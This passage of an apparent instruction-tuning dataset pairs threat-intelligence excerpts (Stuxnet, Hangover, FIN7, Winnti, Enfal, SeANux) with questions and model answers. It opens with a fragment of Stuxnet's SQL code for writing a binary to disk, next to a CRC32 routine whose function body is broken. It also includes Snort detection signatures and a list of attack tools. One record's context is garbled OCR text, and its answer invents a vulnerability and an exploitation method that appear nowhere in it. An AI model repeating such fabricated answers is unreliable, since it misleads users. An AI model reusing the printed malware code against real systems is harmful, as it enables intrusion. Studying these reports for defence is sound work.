@hr <> 0\nGOTO endq\nSET @adss = ( SELECT DATALENGTH(abin) FROM sysbinlog ) SET @aip = 1\nWHILE ( @aip <= @adss )\nBEGIN\nSET @abf = ( SELECT SUBSTRING (abin, @aip, 4096 ) FROM sysbinlog )\nEXEC @hr = sp_OAMethod @aods, 'Write', null, @abf\nIF @hr <> 0\nGOTO endq\nSET @aip = @aip + 4096 END\nEXEC @hr = sp_OAMethod @aods, 'SaveToFile', null, @ainf, 2\nIF @hr <> 0\nGOTO endq\nEXEC sp_OAMethod @aods, 'Close', null\nendq:\nEXEC sp_dropextendedproc sp_dumpdbilog\nBig Headline: Appendix D\nAlgorithm for calculating CRC32 checksum in python:\ncrc32_table = (\n0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988, 0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7, 0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172, 0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b, 0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59, 0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924, 0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433, 0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e, 0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65, 0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0, 0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f, 0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a, 0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, 0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1, 0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc, 0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b, 0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236, 0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f,\n0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d, 0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38, 0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777, 0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2, 0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9, 0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94, 0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d)\ndef crc32(data):\ncrc = 0xffffffff\nfor i in xrange(len(data)):\nreturn crc\n\nQ: In the context of the Stuxnet attack, how does the provided SQL script under 'String 1' manipulate the database to potentially execute arbitrary code? Explain the role of the 'sp_msforeachdb' stored procedure in this process.",
    "output": "A: The SQL script under 'String 1' manipulates the database by dynamically constructing and executing SQL commands. It first checks if the 'MCPVREADVARPERCON' stored procedure exists and retrieves its text. Then, it modifies this text to include an 'openrowset' command that connects to another server ('\\\\.WinCC') and executes a series of commands. If 'sp_msforeachdb' is found in the text, the script attempts to execute a command that will likely fail, preventing further execution. Otherwise, it alters the original procedure to include the 'openrowset' command, which can execute arbitrary code on the connected server. This demonstrates how Stuxnet can inject and execute malicious code within the database environment.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Researchers at Blue Coat Systems have identified an intelligence-gathering campaign related to the Hangover operation detailed in 2013. The targets of this operation appear to be Pakistani and presumably represent military interests.\nThe malware used for this is very simple, but uses a little used format. Instead of the programming languages most commonly used for malware creation, the actors have turned to using Python, a powerful scripting language. The scripts were found embedded inside regular executable files designed to run Python scripts without having to install the full Python package.\nThe inclusion of malicious scripting code in relatively mainstream installers is probably done to avoid antivirus detections, and regular AV detection rates on these executables tend to be quite low. However, BlueCoat Malware Analysis Appliance proactively detects these malwares with a high risk score.\nSeveral indicators point towards the same attackers as were detailed in the Norman Shark (now part of Blue Coat Systems) Hangover report from last year. This campaign is not the first sign of life from these actors after we published our report \u2013 there have been several smaller initiatives during the autumn of 2013.\n\nQuestion: Why did the attackers behind the Hangover operation choose to use Python for their malware, and how does this choice help them evade antivirus detection?\n\nAnswer:",
    "output": "The attackers behind the Hangover operation chose to use Python for their malware because it is a powerful scripting language that is less commonly used for malware creation compared to other programming languages. By embedding the malicious Python scripts inside regular executable files designed to run Python scripts without requiring the full Python package, the attackers aimed to avoid antivirus detections. This strategy is effective because many antivirus solutions have lower detection rates for Python-based malware, especially when it is packaged in a way that makes it appear like a legitimate application. The inclusion of malicious scripting code in relatively mainstream installers helps the malware bypass traditional security measures, making it harder for antivirus software to identify and flag the malicious activity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Spear Phishing Campaign\nAll of the observed intended recipients of the spear phishing campaign appeared to be involved with SEC filings for their respective organizations. Many of the recipients were even listed in their company's SEC filings. The sender email address was spoofed as EDGAR <filings@sec.gov> and the attachment was named \"Important_Changes_to_Form10_K.doc\" (MD5: d04b6410dddee19adec75f597c52e386). An example email is shown in Figure 1.\nWe have observed the following TTPs with this campaign:\nThe malicious documents drop a VBS script that installs a PowerShell backdoor, which uses DNS TXT records for its command and control. This backdoor appears to be a new malware family that FireEye iSIGHT\nIntelligence has dubbed POWERSOURCE. POWERSOURCE is a heavily obfuscated and modified version of the publicly available tool DNS_TXT_Pwnage. The backdoor uses DNS TXT requests for command and control and is installed in the registry or Alternate Data Streams. Using DNS TXT records to communicate is not an entirely new finding, but it should be noted that this has been a rising trend since 2013 likely because it makes detection and hunting for command and control traffic difficult.\nWe also observed POWERSOURCE being used to download a second-stage PowerShell backdoor called TEXTMATE in an effort to further infect the victim machine. The TEXTMATE backdoor provides a reverse shell to attackers and uses DNS TXT queries to tunnel interactive commands and other data. TEXTMATE is \"memory resident\" \u2013 often described as \"fileless\" malware. This is not a novel technique by any means, but it's worth noting since it presents detection challenges and further speaks to the threat actor's ability to remain stealthy and nimble in operations.\nIn some cases, we identified a Cobalt Strike Beacon payload being delivered via POWERSOURCE. This particular Cobalt Strike stager payload was previously used in operations linked to FIN7.\nWe observed that the same domain hosting the Cobalt Strike Beacon payload was also hosting a CARBANAK backdoor sample compiled in February 2017. CARBANAK malware has been used heavily by FIN7 in previous operations.\nBig Headline: Victims\nThus far, we have directly identified 11 targeted organizations in the following sectors:\nFinancial services, with different victims having insurance, investment, card services, and loan focuses\nTransportation\nRetail\nEducation\nIT services\nElectronics\nAll these organizations are based in the United States, and many have international presences. As the SEC is a U.S. regulatory organization, we would expect recipients of these spear phishing attempts to either work for U.S.-based organizations or be U.S.-based representatives of organizations located elsewhere. However, it is possible that the attackers could perform similar activity mimicking other regulatory organizations in other countries.\nBig Headline: Implications\nWe have not yet identified FIN7's ultimate goal in this campaign, as we have either blocked the delivery of the malicious emails or our FaaS team detected and contained the attack early enough in the lifecycle before we observed any data targeting or theft. However, we surmise FIN7 can profit from compromised organizations in several ways. If the attackers are attempting to compromise persons involved in SEC filings due to their information access, they may ultimately be pursuing securities fraud or other investment abuse. Alternatively, if they are tailoring their social engineering to these individuals, but have other goals once they have established a foothold, they may intend to pursue one of many other fraud types.\nPrevious FIN7 operations deployed multiple point-of-sale malware families for the purpose of collecting and exfiltrating sensitive financial data. The use of the CARBANAK malware in FIN7 operations also provides limited evidence that these campaigns are linked to previously observed CARBANAK operations leading to fraudulent\nbanking transactions, ATM compromise, and other monetization schemes.\nBig Headline: Community Protection Event\nFireEye implemented a Community Protection Event \u2013 FaaS, Mandiant, Intelligence, and Products \u2013 to secure all clients affected by this campaign. In this instance, an incident detected by FaaS led to the deployment of additional detections by the FireEye Labs team after FireEye Labs Advanced Reverse Engineering quickly analyzed the malware. Detections were then quickly deployed to the suite of FireEye products.\nThe FireEye iSIGHT Intelligence MySIGHT Portal contains additional information based on our investigations of a variety of topics discussed in this post, including FIN7 and the POWERSOURCE and TEXTMATE malware. Click (<https://www.fireeye.com/products/isight-intelligence.html>)here for more information.\nAnswer this question: Why did FIN7 choose to target personnel involved with SEC filings, and how does this relate to their potential end goals?",
    "output": "FIN7 targeted personnel involved with SEC filings because these individuals have access to valuable information that could be used for securities fraud or other investment abuses. By compromising these individuals, FIN7 could potentially gain insider information that could be monetized through various fraudulent activities. Additionally, once they establish a foothold within an organization, they might pursue other types of fraud, leveraging their initial access.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Digital Certificates\nWhen we discovered the first stolen digital certificate, we didn't realize that stealing the certificates and signing malware for   upcoming attacks against other victims was the modus operandi of that group. In eighteen months, we manage to discover more than a dozen   compromised digital certificates.\nMoreover, we found that those digital certificates seemed to have been used in attacks organized by other hacking groups, presumably coming from China.\nFor example, an attack against South Korean social networks Cyworld and Nate in 2011 (- the attackers used a Trojan that was digitally signed using the certificate of YNK Japan Inc gaming company.)\nA digital certificate of the same company was used recently (March 2013) in Trojans targeting Tibetan and Uyghur activists ().\nIn fact, this story has long roots dating back to 2011. We highly recommend reading this Norman blog post of a similar incident here: .\nAt the same time, in March 2013, Uyghur activists were targeted by another malware which was digitally signed by another gaming company called MGAME Corp according to\nWe believe that the source of all these stolen certificates is same group which we call Winnti. This group either has close contacts with other Chinese hacker groups or sells the certificates on the black market in China.\nBelow is the list of known compromised companies and digital certificates used by the Winnti group in different campaigns:\nBig Headline: Victims\nIt's tempting to assume that Advanced Persistent Threats (s) primarily target high-level institutions: government agencies, ministries, military and political organizations, power stations, chemical plants, critical infrastructure networks, and so on. In this context, it seems unlikely that a commercial company would be at risk unless it was operating on the scale of Google, Adobe or The New York Times, which was recently targeted by a cyber-attack, and this perception is reinforced by the publicity that attacks on corporations and government organizations usually receive. However, any company with data that can be effectively monetized is at risk from APTs. This is exactly what we encountered here: it was not a governmental, political, military, or industrial organization.  The target was specifically gaming companies.\nAnalyzing the Winnti samples helped to identify who and what were the targets. We found that we were dealing with targeted attacks: the Winnti team infects companies that develop and release computer games. It appears the team has been active for quite a while \u2013 since 2009.\nIt's difficult to name all the victims of the Winnti team. Judging by the information that we have at our disposal \u2013 namely the tags within malicious programs, the names of the C&C domains, the companies whose digital certificates were stolen to sign malware, and the countries where detection notifications came from \u2013 we can say that at least 35 companies were infected by the Winnti malware at some time.\nCountries where the affected companies are located:\nThis data demonstrates that the Winnti team targets gaming companies located in various parts of the world, albeit with a strong focus on South East Asia.\nCountries where gaming companies have been affected\nThis geographic diversity is hardly surprising. Often, gaming companies (both publishers and developers) are international, having representatives and offices worldwide. Also, it is common practice for gaming companies from various regions to cooperate. The developers of a game may be located in a different country from its publisher. When a game eventually reaches markets in regions away from its initial 'home', it is often localized and released by other publishers. In the course of this cooperation, the partner companies often grant each other access to network resources to exchange data associated with the gaming content, including distribution kits,\ngaming resources, resource assembly kits, etc. If one company in the network gets infected, it's easy for the cybercriminals to spread the infection throughout the partnership chain.\nBig Headline: Winnti C&C Structure\nDuring the investigation, we identified more than a hundred malicious programs, each individually compiled to attack a particular company. Typically, separate command-and-control (C&C) domains were assigned to each targeted company. Virtually all the C&C domains were arranged as follows: a second-level domain was created without a DNS A-record, i.e., there was no IP address assigned to it.\nIn cases where there was an A-record, the assigned IP address was typically 127.0.0.1. It is also noteworthy that some of the second-level domains that the cybercriminals created for their C&C had very similar names to the domain hosting the site of a certain real gaming company. And the malicious users' domain was resolved to the same IP address which the site of the real gaming company used. In any case, the third-level domains resolved to IP addresses assigned to the attackers' actual C&C servers.\nC&C domain naming and resolution\nSometimes the Winnti team registered their C&C units with public hosts. Judging by the samples identified, these C&C centers were subdomains of such domains as 6600.org, 8866.org, 9966.org or ddns.net.\nFrom the names of the C&C domains or subdomains, the attack targets or countries of residence could be guessed, as in:\nru.gcgame.info\nkr.zzsoft.info\njp.xxoo.co\nus.nhntech.com\nfs.nhntech.com\nas.cjinternet.us\nThe subdomains \"ru\", \"kr\", \"jp\" and \"us\" most probably mean that these C&C servers manage bots hosted on the computers of companies located in Russia, South Korea, Japan and the U.S. respectively, while \"fs\" and \"as\" are acronyms for the names of the companies being attacked.\nSometimes Winnti's malicious programs had a local IP address, such as 192.168.1.136, specified in the settings for the C&C. This could mean that, at some point in time, there was an infected computer that did not have a connection to the Internet, but the cybercriminals needed control over it (it may have been infected while malware was spread via a corporate network). In this case, the cybercriminals deployed a dedicated local C&C server on another compromised computer within the same local network which did have an Internet connection; via that C&C, the first victim computer could be controlled. System administrators often try to isolate critical computers from the outside world. This decreases the probability of haphazard infection, but, apparently, does not always help in a targeted attack.\nIn the Winnti samples that were detected and analyzed, we found 36 unique C&C domains. Most probably, this is only a small portion of all existing Winnti C&C domains, as we only managed to obtain some of the samples from this malware family. This is hardly surprising since these malicious programs are used to execute targeted attacks, so no information is available about many instances of infection; for this reason, we have no way of obtaining samples of the malware used in these undisclosed attacks.\nKnowing the 2nd level domains used by Winnti, we brute forced through all third level sub-domains up to 4 symbols long, and identified those that have the IP addresses of real servers assigned to them. Having searched through subdomains for a total of 12 second level domains, we identified 227 \"live\" third level domains. Many of them are C&C servers for Winnti-class malware that have hitherto remained unidentified.\nAnalyzing the WHOIS data for the 12 second level domains, we found the following list of email addresses used for registration:\nevilsex@gmail.com\njslee.jcr@gmail.com\nwhoismydns@gmail.com\ngoogl3@live.com\nwzcc@cnkker.com\napanku2009@gmail.com\nFor some of these domains, registration data proved to be the same as those for the domain google.com:\nRegistrant: Google Inc.\n1600 Amphitheatre Parkway\nMountain View, California 94043\nUnited States\n+1.6503300100\nJudging by the domain registration data, the Winnti team started their criminal activities as far back as 2007. The early domains were involved in spreading rogue anti-virus programs (FakeAV). From 2009 onwards, domains began to emerge hosting C&C servers for bots used to infect gaming companies. Apparently, the cybercriminals graduated to relatively large-scale penetrations into the corporate networks of gaming companies starting from 2010.\nBig Headline: Known Malware\nThe favorite tool of the attackers is a malicious program we call \"Winnti\". It has evolved since the first use, but we divide all variants into two generations: 1.x and 2.x. Our publication describes both variants of this tool. The second generation (2.x) was used in one of the attacks that we investigated in the active stage and helped the victim to interrupt data transfer and isolate infections in a corporate network.\nIn addition to that, we observed usage of a popular backdoor known as PlugX, which is believed to have Chinese origins, however used only previously in attacks against Tibetan activists.\n\nQuestion: What strategies did the Winnti group employ to target gaming companies, and why were these companies particularly vulnerable to such attacks?\n\nAnswer:",
    "output": "The Winnti group employed targeted attacks against gaming companies by infecting them with custom-compiled malware, often using stolen digital certificates to sign the malicious programs. Gaming companies were particularly vulnerable due to their international operations and extensive partnerships, which often involve sharing network resources and data. This interconnectedness made it easier for the cybercriminals to spread the infection throughout the partnership chain once a single company was compromised.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Why has China shifted its espionage efforts towards cyber operations, and what advantages does this approach offer compared to traditional human espionage?",
    "output": "China has shifted its espionage efforts towards cyber operations because it offers several advantages compared to traditional human espionage. Firstly, it does not require sending anyone overseas, which reduces the risk of defection and the need for lengthy training processes. Secondly, hacking operations can be broken down into simple tasks and partly automated, minimizing the need for operators with advanced technical skills. Thirdly, conducting these operations is cheap and carries a lesser risk than human espionage, as the sponsoring government can claim to be a victim of mistaken identity or a conspiracy. Most importantly, any piece of information stored on a computer or network connected to the Internet is only a few clicks away from being stolen, making cyber operations highly effective for espionage purposes.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Appendix A \u2013 Network IDS signatures\nalert tcp $HOME_NET any -> any any (msg:\"Enfal Trojan Activity\"; flow:established,to_server; content:\"GET|20|\"; depth:4; pcre:\"/^GET\\x20.*\\x2ftrandocs\\x2fnetstate*\\x20HTTP\\x2f1/\"; reference:url,www.secureworks.com/research/threats/sindigoo/; sid:1111111111;)\nalert tcp $HOME_NET any -> any any (msg:\"Enfal Trojan Activity\"; flow:established,to_server; content:\"GET|20|\"; depth:4; pcre:\"/^GET\\x20.*\\x2f(category2|data\\x2fforum|httpdocs\\x2fmm|trandocs\\x2fmm).*[A-F0-9]{2}\\x2d[A-F0-9]{2}\\x2d[A-F0-9]{2}\\x2d[AF0-9]{2}\\x2d[A-F0-9]{2}\\x2d[A-F0-9]\n{2}\\x2f(showNumber|WindowTask|ORDERTIP|ComMand\\x2esec|Cmwhite|ComMand\\x2esec|Command.txt|Query.txt|sunrise|Tiblue|T reference:url,www.secureworks.com/research/threats/sindigoo/; sid:1111111112;)\nalert tcp $HOME_NET any -> any any (msg:\"Enfal Trojan Activity\"; flow:established,to_server; content:\"POST|20|\"; depth:5; content:!\"|0a|Referer|3a20|\"; pcre:\"/^POST\\x20.*\\x2fcg[az]\\x2dbin\\x2f(Clnpp5|CMS_ClearAll|CMS_ListImg|CMS_SubitAll|dieosn83|Dskx8|Htrc3|Info|Owpp4|Owpq4|Rwpq1|Trpq8|Trpq8|vip reference:url,www.secureworks.com/research/threats/sindigoo/; sid:1111111113;)\nalert tcp $HOME_NET any -> any any (msg:\"Enfal Trojan Activity\"; flow:established,to_server; content:\"POST|20|\"; depth:5; pcre:\"/^POST\\x20.*\\d{6,12}\\x2ephp\\x20HTTP\\x2f1.*\\r\\n\\r\\n[a-z0-9\\x2d]{4,15}\\x3a[A-F0-9]{2}\\x2d[A-F0-9]{2}\\x2d[A-F0-9]{2}\\x2d[A-F09]{2}\\x2d[A-F0-9]{2}\\x2d[A-F0-9]{2}/s\"; reference:url,www.secureworks.com/research/threats/sindigoo/; sid:1111111114;)\nalert tcp $HOME_NET any -> any any (msg:\"RegSubsDat Trojan Activity\"; flow:established,to_server; content:\"POST|20|\"; depth:5; content:\"|2f|log|20|HTTP|2f|1\"; pcre:\"/^POST\\x20.*\\x2f[A-F0-9]{6}0000\\x2flog\\x20HTTP\\x2f1/\"; reference:url,www.secureworks.com/research/threats/sindigoo/; sid:1111111115;)\n\nBased on the above text, answer a question. How do the network intrusion detection system (IDS) signatures provided in the Sin Digoo affair report help in identifying Enfal Trojan activity? Explain the significance of the patterns and regular expressions used in these signatures.",
    "output": "The network IDS signatures provided in the Sin Digoo affair report help in identifying Enfal Trojan activity by matching specific patterns in network traffic. For example, the signature with the message 'Enfal Trojan Activity' and SID 1111111111 uses a regular expression to detect GET requests containing the path '/trandocs/netstate'. This pattern indicates that the request is likely part of the Enfal Trojan's communication with its command and control server. Similarly, other signatures use regular expressions to match specific paths and parameters in HTTP requests, such as '/category2', '/data/forum', '/httpdocs/mm', and others, which are associated with Enfal Trojan activity. These patterns and regular expressions are crucial for detecting and blocking malicious traffic related to the Enfal Trojan, thereby helping to protect networks from this advanced persistent threat.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Oup\u00a3\u00a5!e.11,e.Hue \u00abBHJ'.TPeH&ero ,cup a Boquoro ,!!OR:;yMeHTa\u00bb ,(BCll)\nOCHOBa.HUeM ,iJl;..IDI Ha'IBCJieHUlI .KB.IDD0TC.11: BiHJTpee:ene cn:paBO\"IHbie \u0141OL\"\u2022yMeiHT!bl (\u0141a.11ee BC):(), npe,;:i;oCTa1meHH1>re B Eyx.ranTepCKyio CJl}Oi\u01416y Ou\u0141eTcTEeHH1>Th.m cpy1rn.Il1IOHam.HNMII-I C.1I)OK63.11m opr a.HU3a.QlilI 10 CKOpn opau;1m \u00ab:PO caTOIII\u00bb, co,;:i;ep:ncarmre ,;:i;aHH1>Ie O COBepmeHHLIX B OT'ieTHOM nepuo,.::J;e X0-3.ll:HCTBeHHLIX onepmu.n Ha OCHOBe CJ1eA)IIOm11-Ix lICT01llUIKOB lIHC[)OpMa.QlUI:\n[ _ Co6CTEeHH1>re ,ii;a.HHhle OTBeTCTBeHHLIX cpyHKUIIOHa.m.HLL\"'\\. CJl}OI\u01416.\n2. Jl:rnHLie, npe,;:i;oCTaBJieHHLie BHyrpH.rpyrrn OBbI:M:lI KOHTpar eHT3.11fi-I.\n3. ,lJ;aHHhle, npe.,;:i;ocra!BJieHHhle EHeilIH:HIIUI KOHTpareHT3.11fiI.\nBo BHyrpeHH:HX cnpaEOTIHLIX ,il;OK}/IlfeHTax ,il;OJI:il:CHa co,;:i;ep;i\u0141aT&C_lil lIHC[)OpI1.faUlI_lil TO.m.KO 0 TeX X0-3.ll:HCTBeHH!bIX onepaQ11.n, COBepmeHH1>IX E Te\"Ie1me OT'ieTHOTO nepIIo,;:i;a, no KOTOpbI.Lsl He no.rryqeHhl nepBIITIHLie ,i];OK}'11feHTbL HanpIIMep, eCJIII E Te'ieHue OT'ieTHoro nepIIo,;:i;a 61,mo npoII3Be,;:i;eHo TPII rrocTaBKII-I TIVIl.l o,;:i;Horo BII,;:i;a II no nepBbIIlf ,i:l;B}l\"Ilf U3 HUX ,;:i;o 3-ro pa6011ero ,;:i;H.11: MeCJlll,a, cJie,.,JJ;yrow:ero 3a OT'ieTHNM, Il6bOITb JIY11OeHLTP, a;II rreCeHa pBlITOTIHLJI!hKiO e ,iJl;IIOOCK.}ilfl\\e,;:i;HfeHll TbIII, OBCTaBO BHKya TTpivll.leJrne. ru: cnpaBO'iHOM ,ill;OK}'11feHTe ,ill;OJI:il:CHa\nAnswer this question: In the context of the Roaming Tiger APT report, how does the attacker leverage the 'BHJ'.TPeH&ero ,cup a Boquoro ,!!OR:;yMeHTa' vulnerability to compromise systems? Explain the specific techniques and methods used.",
    "output": "The attacker leverages the 'BHJ'.TPeH&ero ,cup a Boquoro ,!!OR:;yMeHTa' vulnerability by exploiting weaknesses in the system's ability to handle certain types of data. Specifically, the attack involves using specially crafted payloads that exploit the system's processing of 'COBCTEeHH1>re ,ii;a.HHhle OTBeTCTBeHHLIX cpyHKUIIOHa.m.HLL' (complex data structures). This allows the attacker to execute arbitrary code and gain control over the system. The process involves three main steps: 1. Identifying and preparing the target system for exploitation. 2. Crafting and delivering the malicious payload. 3. Executing the payload to achieve the desired level of access. The attacker ensures that the payload is designed to bypass existing security measures and operate without detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Notable Activity\n4 http://vk.com/syrianelectronicarmy 5  https://ello.co/syrianelectronicarmy  6 https://www.pinterest.com/officialsea/ 7 http://instagram.com/official_sea2  8 https://www.youtube.com/user/SEAOfficialChannel 9  https://twitter.com/official_sea16  10 http://sea.sy/rss/en\nJACKAL perceived as false.2  The deleted article discussed depleting military resources of President Assad, in terms of soldiers, since the start of the U.S. campaign in Syria against the Islamic State. The article, however, was soon reposted by the International Business Times and remains available.3\nDeADeye JACKAL used to be limited to operating through its website, Twitter account, and Facebook account, which proved problematic in some ways since their communications could be terminated more easily when Twitter or Facebook decided to shut down their accounts. It became a joke to DeADeye JACKAL how many Facebook pages it could start up that would be shut down. However, DeADeye JACKAL did realize that more stable and varied dissemination pathways for their messaging were needed. Additionally, the group decided it also needed communications that would have less chance of being monitored by its enemies.\nIn September 2013, DeADeye JACKAL changed its email provider from Gmail to Mail.ru. The change was likely a result of suspicions that their emails were being monitored in light of the leaks made by edward Snowden earlier in 2013. In other moves to protect privacy, DeADeye JACKAL opened up accounts with VK, formerly VKontakte4  (the Russia-based social media website similar to Facebook owned by Mail.ru Group and ello5), a new social media website that boasts that it does not sell ads or its users' data to advertisers. It also does not allow any data mining against the users of its site. DeADeye JACKAL also launched a mobile site for its website and an Android app. These are all in addition to the group's already-established accounts on Pinterest6, Instagram7 , youTube8, and Twitter9 .\nMost notably, the group developed and released its own operating system, called SeANux. SeANux offers little overall improvement over other Linux-based systems like Kali or BackTrack. SeANux automatically loads a desktop system monitor that makes several network requests, creating a sidebar. The sidebar provides the user information about the system, running processes, weather (Damascus, DI, Syria), currency rates, and some other high-level information. Also on this side bar is a small window with a feed of news from DeADeye JACKAL's website10 .\nNotable Activity\nThe most notable aspect of SeANux is the tools it offers. SeANux offers some standard offensive/pentesting tools, including Metasploit Framework, SqLMap, nMap, Aircrack, and John the Ripper. There is also an included directory with other miscellaneous PHP and Perl scripts, however most of these do not appear to be created by DeADeye JACKAL.\nSeANux also offers a custom set of offensive/pentesting tools including:\n\u2022 SEA SHELL - A basic web shell.\n\u2022 UPLOADER - A web application for uploading files to the system where the web app is hosted.\n\u2022 MYSQL EXECUTOR - A web application for executing commands on local and remote MySqL servers.\n\u2022 JOOMLA & WORDPRESS SCANNER - A web application for checking whether a remote system is running WordPress or Joomla.\n\u2022 EXECUTER - A very rudimentary webshell for executing system commands where the web app is hosted.\n\u2022 DDOS ATTACKER - A basic DDoS web application. The adversary specifies an IP address they want to flood with TCP or UDP traffic.\n\u2022 WORDPRESS BRUTE FORCE ATTACKER - A web application for preforming simple brute force attack against a WordPress site.\n\u2022 JOOMLA BRUTE FORCE ATTACKER - A web application for preforming simple brute force against Joomla sites.\n\u2022 WEB SCANNER - A web application for scanning a remote web server for files and folders.\n\u2022 ORACLE QUERY EXECUTOR - A web application for executing commands on local and remote Oracle database servers.\n\u2022 ACP FINDER - A web application to scan for what are believed to be admin control panels.\n\u2022 BACK CONNECTION - A web application for creating a reverse shell connection allowing another computer to control where the app is hosted.\n\u2022 5.2.3 SAFEMODE BYPASS / 5.2.11-5.3.0 SAFE MODE BYPASS - Both are tools for attempting to bypass some of PHP's built-in security.\nDeADeye JACKAL has not attempted the ruse that Anonymous did in 2012 when they released Anonymous-OS, which was found to be riddled with Trojans. SeANux does connect to some DeADeye JACKAL-controlled\nresources such as their RSS feed, images in the webshells, and a Firefox custom SeANux homepage. It is possible for DeADeye JACKAL to monitor to see who is connecting to these resources, but outside of that, the operating system functions normally.\nSmall Headline: FRATERNAl jACKAl\nIn 2012 and 2013, a four-phased attack known as Operation Ababil, or OpAbabil, was conducted by a group of Iranian actors targeting U.S. financial institutions with DDoS attacks.\nThis adversary, which CrowdStrike tracks under the name FRATeRNAL JACKAL, has been suspected of having ties to the Iranian government. It has been known to increase attack volume during periods of economic tension between Iran and western countries. Despite suspicion of political motivations, the group has publicly attested in several Pastebin.com posts that the motivation for these attacks are negative depictions of the Muslim Prophet Muhammad in several youTube videos.\nAttacks from this adversary group have been primarily conducted using a botnet of public-facing web servers that have been exploited through vulnerable Content Management Systems (CMS). Unlike traditional botnets in which infected hosts connect to control servers for tasking, within FRATeRNAL JACKAL's botnet, nodes are directly tasked by the adversary through multiple layers of infrastructure.\nCrowdStrike Intelligence continued to actively investigate this adversary during 2014, specifically seeking means by which it propagated its botnet. In October, a PHP script was identified in connection with this adversary. This script is used for scanning lists of domains by parsing each domain's robots.txt file to identify any server running the CMS Joomla. Domains identified from this script are directly posted to a hard-coded control server, something not seen previously by CrowdStrike with this adversary's toolkit.\nNormally, performing server reconnaissance by parsing the robots.txt file of a server is a trivial task. However, when looked at in the context of this adversary's strategic operations, it 